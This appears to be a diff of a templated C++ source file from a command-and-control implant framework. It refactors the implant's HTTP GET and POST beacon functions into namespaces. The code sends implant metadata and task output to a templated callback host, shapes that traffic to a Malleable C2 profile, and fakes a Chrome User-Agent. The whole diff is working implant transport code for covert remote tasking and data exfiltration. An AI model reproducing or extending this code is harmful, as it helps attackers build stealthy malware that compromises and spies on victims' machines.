@@ -35,207 +35,213 @@ using namespace std::string_literals;
 #include "core/settings.h"
 #include "data/transforms/transforms.h"
 
-std::vector <uint8_t> [[ http_get_function_name ]](std::vector<uint8_t> metadata_as_msgpack) {
-    std::string http_response_buffer;
+namespace [[ http_get_function_name ]] {
+    inline std::vector <uint8_t> get(std::vector<uint8_t> metadata_as_msgpack) {
+        std::string http_response_buffer;
 
-    // Hold bytes in a string container, as all the transforms want a string
-    // do NOT change the `metadata` var name prior to templating, it's needed for it
-    std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
+        // Hold bytes in a string container, as all the transforms want a string
+        // do NOT change the `metadata` var name prior to templating, it's needed for it
+        std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
 
-    //setup default header, which at minumum contains the useragent
-    //!! NOTE: Placeholder value, mc2 does not apply here yet
-    std::vector<std::wstring> headers = {
-            L"User-Agent: GoogleChrome", 
-    };
+        //setup default header, which at minumum contains the useragent
+        //!! NOTE: Placeholder value, mc2 does not apply here yet
+        std::vector<std::wstring> headers = {
+                L"User-Agent: GoogleChrome", 
+        };
 
-    // --- Malleable C2  ---
+        // --- Malleable C2  ---
 
-    // --- MetaData Transforms ---
-    //Transform metadata before it goes out to match the malleablec2 profile
-    [%- for transform in http_get_client_metadata_transforms_list %]
-    [[ render_transform(transform, 'metadata') ]]
-    [%- endfor %]
-    // --- End MetaData Transforms ---
-
-    //base variables declared near top so they are in scope
-    // Start with the base URI from the profile
-    std::wstring uri = L"[[ http_get_uri ]]";
-    std::string request_body = ""; // NULL by default, as that's what the wininet wants
-    std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
-
-    [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
-    [%- if http_get_client_metadata_terminator == "header" %]
-    headers.push_back(L"[[http_get_client_metadata_terminator_value]]: " + w_metadata);
-    [% endif %]
-
-    [# HTTP_GET: METADATA: PARAMETER - IF MC2 says it wants a header for where to find the metadata... #]
-    [#(e.g., /search?q=BASE64...)#]
-    [%- if http_get_client_metadata_terminator == "parameter" %]
-    // Append '?' or '&' depending on existing query string
-    if (uri.find(L'?') != std::wstring::npos) {
-        uri += L"&";
-    } else {
-        uri += L"?";
-    }
-    uri += L"[[http_get_client_metadata_terminator_value]]";
-    uri += L"=";
-    uri += w_metadata;
-    [% endif %]
-
-    [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
-    [%- if http_get_client_metadata_terminator == "uri-append" %]
-
-    //could use append from transform here too 
-    uri += w_metadata;
-    [% endif %]
-
-
-    [# HTTP_GET: METADATA: PRINT - IF MC2 says it wants a header for where to find the metadata... #]
-    [%- if http_get_client_metadata_terminator == "print" %]
-
-    //convert back to string for HTTP_GET function
-    request_body.assign(w_metadata.begin(), w_metadata.end());
-    [%- endif %]
-
-    // --- End Malleable C2 Metadata transport method ---
-
-    // --- Add addtl headers/params as specified in mc2 b4 sending off. ---
-    [%- for header_or_param in http_get_client_headers_or_parameters_list %]
-    [[ render_add_headers_or_parameters(header_or_param) ]]
-    [%- endfor %]
-    // --- end --- 
-
-    // Call the HTTP_GET
-    // Note: We pass the constructed 'uri' and 'headers' here
-    //if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, L"[[http_user_agent]]", headers, request_body, http_response_buffer)) {
-    if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, headers, request_body, http_response_buffer)) {
-
-        if (http_response_buffer.empty()){
-            //blank buffer
-            return std::vector<uint8_t> {};
-        }
-
-        // --- Reverse Transforms for Server output ---
-
-        [%- for transform in http_get_server_output_transforms_list %]
-        [[ render_reverse_transform(transform, 'http_response_buffer') ]]
+        // --- MetaData Transforms ---
+        //Transform metadata before it goes out to match the malleablec2 profile
+        [%- for transform in http_get_client_metadata_transforms_list %]
+        [[ render_transform(transform, 'metadata') ]]
         [%- endfor %]
+        // --- End MetaData Transforms ---
 
-        // --- End Reverse Transforms for Server output ---
-        //string -> vector
-        std::vector<uint8_t> response_buffer(http_response_buffer.begin(), http_response_buffer.end());
-        return response_buffer;
-    }
-}
+        //base variables declared near top so they are in scope
+        // Start with the base URI from the profile
+        std::wstring uri = L"[[ http_get_uri ]]";
+        std::string request_body = ""; // NULL by default, as that's what the wininet wants
+        std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
 
-int [[ http_post_function_name ]](std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
-    //turn into a string container becuase reasons that I don't remeebr atm
-    std::string payload(task_response_msgpack_list.begin(), task_response_msgpack_list.end());
+        [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
+        [%- if http_get_client_metadata_terminator == "header" %]
+        headers.push_back(L"[[http_get_client_metadata_terminator_value]]: " + w_metadata);
+        [% endif %]
 
-    // --- Transforms for ID and Output ---
-
-    //Transform ID as specified by malleablec2
-    [% for transform in http_post_client_id_transforms_list %]
-    [[ render_transform(transform, 'implant_uuid') ]]
-    [%- endfor %]
-
-    //Transform msgpack output as specified by malleablec2
-    [% for transform in http_post_client_output_transforms_list %]
-    [[ render_transform(transform, 'payload') ]]
-    [%- endfor %]
-    // --- End Transforms for ID and Output ---
-
-
-    // convert to w strings because winapi wants that
-    std::wstring w_payload(payload.begin(), payload.end());
-    std::wstring w_id(implant_uuid.begin(), implant_uuid.end());
-
-    //setup default header, which at minumum contains the useragent
-    //!! NOTE: Placeholder value, mc2 does not apply here yet
-    std::vector<std::wstring> headers = {
-            L"User-Agent: GoogleChrome", 
-    };
-    std::wstring uri = L"[[ http_post_uri ]]";
-    std::string final_post_body = ""; 
-
-
-    // --- Malleable C2 ID/Output transport method ---
-
-    [% if http_post_client_id_terminator == "header" %]
-
-        //Hold ID in [[ http_post_client_id_terminator_value ]]
-        headers.push_back(L"[[ http_post_client_id_terminator_value ]]: " + w_id);
-
-    [%- endif %]
-
-    [%- if http_post_client_id_terminator == "parameter" %]
-        
-        //POST data stored in parameter [[http_post_client_id_terminator]]
+        [# HTTP_GET: METADATA: PARAMETER - IF MC2 says it wants a header for where to find the metadata... #]
+        [#(e.g., /search?q=BASE64...)#]
+        [%- if http_get_client_metadata_terminator == "parameter" %]
+        // Append '?' or '&' depending on existing query string
         if (uri.find(L'?') != std::wstring::npos) {
-            // URI already has query parameters
             uri += L"&";
         } else {
-            // First query parameter
             uri += L"?";
         }
-        uri += L"[[ http_post_client_id_terminator_value ]]=" + w_id;
+        uri += L"[[http_get_client_metadata_terminator_value]]";
+        uri += L"=";
+        uri += w_metadata;
+        [% endif %]
 
-    [%- endif %]
-    
-    [%- if http_post_client_id_terminator == "uri-append" %]
+        [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
+        [%- if http_get_client_metadata_terminator == "uri-append" %]
 
-    //could use append from transform here too
-    uri += w_id;
-
-    [% endif %]
-    
-
-    // 5. Handle Output Placement
-    [# no %- here, as otherwise the previous comment adds the below headers line in #]
-    [% if http_post_client_output_terminator == "header" %]
-
-    headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + w_payload);
-
-    [%- endif %]
-
-    [% if http_post_client_output_terminator == "print" %]
-
-    //convert back to string for HTTP_POST function
-    final_post_body.assign(w_payload.begin(), w_payload.end());
-
-    [%- endif %]
-
-    [% if http_post_client_output_terminator == "parameter" %]
-
-    // This is dangerous for large output, but Malleable C2 allows it
-    std::wstring w_body_param(w_payload.begin(), w_payload.end());
-    if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
-    uri += L"[[ http_post_client_output_terminator_value ]]=" + w_body_param;
-
-    [%- endif %]
-
-    [%- if http_post_client_output_terminator == "uri-append" %]
-
-    //could use append from transform here too
-    uri += w_payload;
-
-    [% endif %]
+        //could use append from transform here too 
+        uri += w_metadata;
+        [% endif %]
 
 
-    // --- Add addtl headers/params as specified in mc2 b4 sending off ---
-    [%- for header_or_param in http_post_client_headers_or_parameters_list %]
-    [[ render_add_headers_or_parameters(header_or_param) ]]
-    [%- endfor %]
-    // --- end ---
+        [# HTTP_GET: METADATA: PRINT - IF MC2 says it wants a header for where to find the metadata... #]
+        [%- if http_get_client_metadata_terminator == "print" %]
 
-    // --- End Malleable C2 ID/Output transport method ---
+        //convert back to string for HTTP_GET function
+        request_body.assign(w_metadata.begin(), w_metadata.end());
+        [%- endif %]
 
-    // send data back to server
-    std::string response_buffer;
-    if (!HTTP_POST(L"[[callback_host]]", [[callback_port]], L"[[http_post_verb]]", uri, headers, final_post_body, response_buffer)) {
-        //for debugging, remove cerr on prod
-        std::cerr << "Error posting data" << std::endl;
-        return 1;
+        // --- End Malleable C2 Metadata transport method ---
+
+        // --- Add addtl headers/params as specified in mc2 b4 sending off. ---
+        [%- for header_or_param in http_get_client_headers_or_parameters_list %]
+        [[ render_add_headers_or_parameters(header_or_param) ]]
+        [%- endfor %]
+        // --- end --- 
+
+        // Call the HTTP_GET
+        // Note: We pass the constructed 'uri' and 'headers' here
+        //if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, L"[[http_user_agent]]", headers, request_body, http_response_buffer)) {
+        if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, headers, request_body, http_response_buffer)) {
+
+            if (http_response_buffer.empty()){
+                //blank buffer
+                return std::vector<uint8_t> {};
+            }
+
+            // --- Reverse Transforms for Server output ---
+
+            [%- for transform in http_get_server_output_transforms_list %]
+            [[ render_reverse_transform(transform, 'http_response_buffer') ]]
+            [%- endfor %]
+
+            // --- End Reverse Transforms for Server output ---
+            //string -> vector
+            std::vector<uint8_t> response_buffer(http_response_buffer.begin(), http_response_buffer.end());
+            return response_buffer;
+        }
     }
-    return 0;
+
+
+}
+
+namespace [[ http_post_function_name ]] {
+    inline int post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
+        //turn into a string container becuase reasons that I don't remeebr atm
+        std::string payload(task_response_msgpack_list.begin(), task_response_msgpack_list.end());
+
+        // --- Transforms for ID and Output ---
+
+        //Transform ID as specified by malleablec2
+        [% for transform in http_post_client_id_transforms_list %]
+        [[ render_transform(transform, 'implant_uuid') ]]
+        [%- endfor %]
+
+        //Transform msgpack output as specified by malleablec2
+        [% for transform in http_post_client_output_transforms_list %]
+        [[ render_transform(transform, 'payload') ]]
+        [%- endfor %]
+        // --- End Transforms for ID and Output ---
+
+
+        // convert to w strings because winapi wants that
+        std::wstring w_payload(payload.begin(), payload.end());
+        std::wstring w_id(implant_uuid.begin(), implant_uuid.end());
+
+        //setup default header, which at minumum contains the useragent
+        //!! NOTE: Placeholder value, mc2 does not apply here yet
+        std::vector<std::wstring> headers = {
+                L"User-Agent: GoogleChrome", 
+        };
+        std::wstring uri = L"[[ http_post_uri ]]";
+        std::string final_post_body = ""; 
+
+
+        // --- Malleable C2 ID/Output transport method ---
+
+        [% if http_post_client_id_terminator == "header" %]
+
+            //Hold ID in [[ http_post_client_id_terminator_value ]]
+            headers.push_back(L"[[ http_post_client_id_terminator_value ]]: " + w_id);
+
+        [%- endif %]
+
+        [%- if http_post_client_id_terminator == "parameter" %]
+            
+            //POST data stored in parameter [[http_post_client_id_terminator]]
+            if (uri.find(L'?') != std::wstring::npos) {
+                // URI already has query parameters
+                uri += L"&";
+            } else {
+                // First query parameter
+                uri += L"?";
+            }
+            uri += L"[[ http_post_client_id_terminator_value ]]=" + w_id;
+
+        [%- endif %]
+        
+        [%- if http_post_client_id_terminator == "uri-append" %]
+
+        //could use append from transform here too
+        uri += w_id;
+
+        [% endif %]
+        
+
+        // 5. Handle Output Placement
+        [# no %- here, as otherwise the previous comment adds the below headers line in #]
+        [% if http_post_client_output_terminator == "header" %]
+
+        headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + w_payload);
+
+        [%- endif %]
+
+        [% if http_post_client_output_terminator == "print" %]
+
+        //convert back to string for HTTP_POST function
+        final_post_body.assign(w_payload.begin(), w_payload.end());
+
+        [%- endif %]
+
+        [% if http_post_client_output_terminator == "parameter" %]
+
+        // This is dangerous for large output, but Malleable C2 allows it
+        std::wstring w_body_param(w_payload.begin(), w_payload.end());
+        if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
+        uri += L"[[ http_post_client_output_terminator_value ]]=" + w_body_param;
+
+        [%- endif %]
+
+        [%- if http_post_client_output_terminator == "uri-append" %]
+
+        //could use append from transform here too
+        uri += w_payload;
+
+        [% endif %]
+
+
+        // --- Add addtl headers/params as specified in mc2 b4 sending off ---
+        [%- for header_or_param in http_post_client_headers_or_parameters_list %]
+        [[ render_add_headers_or_parameters(header_or_param) ]]
+        [%- endfor %]
+        // --- end ---
+
+        // --- End Malleable C2 ID/Output transport method ---
+
+        // send data back to server
+        std::string response_buffer;
+        if (!HTTP_POST(L"[[callback_host]]", [[callback_port]], L"[[http_post_verb]]", uri, headers, final_post_body, response_buffer)) {
+            //for debugging, remove cerr on prod
+            std::cerr << "Error posting data" << std::endl;
+            return 1;
+        }
+        return 0;
+    }
 }
